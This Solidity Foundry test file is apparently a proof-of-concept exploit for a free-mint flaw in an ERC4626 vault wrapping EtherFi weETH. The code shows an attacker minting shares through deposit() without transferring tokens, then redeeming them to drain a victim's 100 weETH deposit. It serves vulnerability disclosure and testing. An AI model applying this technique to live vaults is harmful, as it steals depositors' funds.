// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {TestBase_EtherFiWeETHStandardExchange} from "contracts/test/bases/TestBase_EtherFiWeETHStandardExchange.sol";

contract EtherFiCraneFreeMint_Test is TestBase_EtherFiWeETHStandardExchange {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function test_freeMint_drain_weETH() public {
        // Honest victim deposits 100 weETH via SE path.
        uint256 victimIn = 100 ether;
        _mintWeViaE(victim, victimIn);
        vm.startPrank(victim);
        hermeticWeEth.approve(seVault, victimIn);(uint256 vShares,) = seIn.exchangeIn(IERC20(address(hermeticWeEth)), victimIn, IERC20(seVault), 0, victim, false, block.timestamp + 1 hours
        );
        vm.stopPrank();(uint256 vValueBefore,) = seIn.previewExchangeIn(IERC20(seVault), vShares, IERC20(address(hermeticWeEth)));
        console2.log("victim shares", vShares);
        console2.log("victim redeem value before (weETH)", vValueBefore);
        console2.log("ERC4626 totalAssets (lastTotalAssets)", IERC4626(seVault).totalAssets());

        // ---- attack: unprivileged EOA, zero capital ----
        uint256 W = hermeticWeEth.balanceOf(seVault);
        console2.log("vault weETH balance W", W);
        uint256 atkWeBefore = hermeticWeEth.balanceOf(attacker);
        vm.startPrank(attacker);
        uint256 minted = IERC4626(seVault).deposit(W, attacker);
        console2.log("attacker shares minted for 0 transfer", minted);
        console2.log("totalSupply after", IERC20(seVault).totalSupply());(uint256 out,) = seIn.exchangeIn(IERC20(seVault), minted, IERC20(address(hermeticWeEth)), 0, attacker, false, block.timestamp + 1 hours
        );
        vm.stopPrank();
        uint256 profit = hermeticWeEth.balanceOf(attacker) - atkWeBefore;
        console2.log("attacker weETH out (profit, cost=0)", profit);(uint256 vValueAfter,) = seIn.previewExchangeIn(IERC20(seVault), vShares, IERC20(address(hermeticWeEth)));
        console2.log("victim redeem value after (weETH)", vValueAfter);
        console2.log("vault weETH after", hermeticWeEth.balanceOf(seVault));

        assertEq(out, profit);
        assertGt(profit, 99 ether, "attacker drained");
        assertLt(vValueAfter, 1 ether, "victim lost");
    }

    function test_freeMint_viaCraneRedeem() public {
        uint256 victimIn = 100 ether;
        _mintWeViaE(victim, victimIn);
        vm.startPrank(victim);
        hermeticWeEth.approve(seVault, victimIn);seIn.exchangeIn(IERC20(address(hermeticWeEth)), victimIn, IERC20(seVault), 0, victim, false, block.timestamp + 1 hours);
        vm.stopPrank();

        uint256 W = hermeticWeEth.balanceOf(seVault);
        vm.startPrank(attacker);
        uint256 minted = IERC4626(seVault).deposit(W, attacker);
        uint256 got = IERC4626(seVault).redeem(minted, attacker, attacker);
        vm.stopPrank();
        console2.log("crane redeem path: attacker weETH", got);
        assertGt(got, 99 ether);
    }
}
